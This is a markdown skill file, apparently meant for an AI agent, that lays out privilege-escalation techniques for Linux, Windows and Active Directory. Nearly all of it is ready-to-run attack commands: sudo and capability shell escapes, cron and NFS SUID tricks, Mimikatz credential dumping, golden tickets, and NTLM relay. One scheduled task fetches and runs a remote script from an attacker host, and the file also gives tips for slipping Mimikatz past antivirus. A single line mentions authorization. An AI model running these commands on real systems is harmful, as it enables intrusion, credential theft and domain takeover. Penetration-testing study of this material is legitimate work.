---
name: privilege-escalation-methods
description: "Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations."
risk: unknown
source: community
author: zebbern
date_added: "2026-02-27"
---

# Privilege Escalation Methods

## Purpose

Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.

## Inputs/Prerequisites

- Initial low-privilege shell access on target system
- Kali Linux or penetration testing distribution
- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus
- Understanding of Windows/Linux privilege models
- For AD attacks: Domain user credentials and network access to DC

## Outputs/Deliverables

- Root or Administrator shell access
- Extracted credentials and hashes
- Persistent access mechanisms
- Domain compromise (for AD environments)

---

## Core Techniques

### Linux Privilege Escalation

#### 1. Abusing Sudo Binaries

Exploit misconfigured sudo permissions using GTFOBins techniques:

```bash
# Check sudo permissions
sudo -l

# Exploit common binaries
sudo vim -c ':!/bin/bash'
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/hosts    # then type: !bash
sudo man man            # then type: !bash
sudo env /bin/bash
```

#### 2. Abusing Scheduled Tasks (Cron)

```bash
# Find writable cron scripts
ls -la /etc/cron*
cat /etc/crontab

# Inject payload into writable script
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh

# Wait for execution, then:
/bin/bash -p
```

#### 3. Abusing Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Python with cap_setuid
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
```

#### 4. NFS Root Squashing

```bash
# Check for NFS shares
showmount -e <victim_ip>

# Mount and exploit no_root_squash
mkdir /tmp/mount
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```

#### 5. MySQL Running as Root

```bash
# If MySQL runs as root
mysql -u root -p
\! chmod +s /bin/bash
exit
/bin/bash -p
```

---

### Windows Privilege Escalation

#### 1. Token Impersonation

```powershell
# Using SweetPotato (SeImpersonatePrivilege)
execute-assembly sweetpotato.exe -p beacon.exe

# Using SharpImpersonation
SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
```

#### 2. Service Abuse

```powershell
# Using PowerUp
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

#### 3. Abusing SeBackupPrivilege

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

#### 4. Abusing SeLoadDriverPrivilege

```powershell
# Load vulnerable Capcom driver
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
.\ExploitCapcom.exe
```

#### 5. Abusing GPO

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

---

### Active Directory Attacks

#### 1. Kerberoasting

```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request

# Using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
```

#### 2. AS-REP Roasting

```powershell
.\Rubeus.exe asreproast
```

#### 3. Golden Ticket

```powershell
# DCSync to get krbtgt hash
mimikatz# lsadump::dcsync /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
```

#### 4. Pass-the-Ticket

```powershell
.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
klist  # Verify ticket
```

#### 5. Golden Ticket with Scheduled Tasks

```powershell
# 1. Elevate and dump credentials
mimikatz# token::elevate
mimikatz# vault::cred /patch
mimikatz# lsadump::lsa /patch

# 2. Create golden ticket
mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi

# 3. Create scheduled task
schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
schtasks /run /s DOMAIN /TN "enterprise"
```

---

### Credential Harvesting

#### LLMNR Poisoning

```bash
# Start Responder
responder -I eth1 -v

# Create malicious shortcut (Book.url)
[InternetShortcut]
URL=https://facebook.com
IconIndex=0
IconFile=\\attacker_ip\not_found.ico
```

#### NTLM Relay

```bash
responder -I eth1 -v
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Dumping with VSS

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

---

## Quick Reference

| Technique | OS | Domain Required | Tool |
|-----------|-----|-----------------|------|
| Sudo Binary Abuse | Linux | No | GTFOBins |
| Cron Job Exploit | Linux | No | Manual |
| Capability Abuse | Linux | No | getcap |
| NFS no_root_squash | Linux | No | mount |
| Token Impersonation | Windows | No | SweetPotato |
| Service Abuse | Windows | No | PowerUp |
| Kerberoasting | Windows | Yes | Rubeus/Impacket |
| AS-REP Roasting | Windows | Yes | Rubeus |
| Golden Ticket | Windows | Yes | Mimikatz |
| Pass-the-Ticket | Windows | Yes | Rubeus |
| DCSync | Windows | Yes | Mimikatz |
| LLMNR Poisoning | Windows | Yes | Responder |

---

## Constraints

**Must:**
- Have initial shell access before attempting escalation
- Verify target OS and environment before selecting technique
- Use appropriate tool for domain vs local escalation

**Must Not:**
- Attempt techniques on production systems without authorization
- Leave persistence mechanisms without client approval
- Ignore detection mechanisms (EDR, SIEM)

**Should:**
- Enumerate thoroughly before exploitation
- Document all successful escalation paths
- Clean up artifacts after engagement

---

## Examples

### Example 1: Linux Sudo to Root

```bash
# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Exploit vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
| Kerberoasting returns no hashes | Check for service accounts with SPNs |
| Token impersonation fails | Verify SeImpersonatePrivilege is present |
| NFS mount fails | Check NFS version compatibility (vers=2,3,4) |

---

## Additional Resources

For detailed enumeration scripts, use:
- **LinPEAS**: Linux privilege escalation enumeration
- **WinPEAS**: Windows privilege escalation enumeration
- **BloodHound**: Active Directory attack path mapping
- **GTFOBins**: Unix binary exploitation reference

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
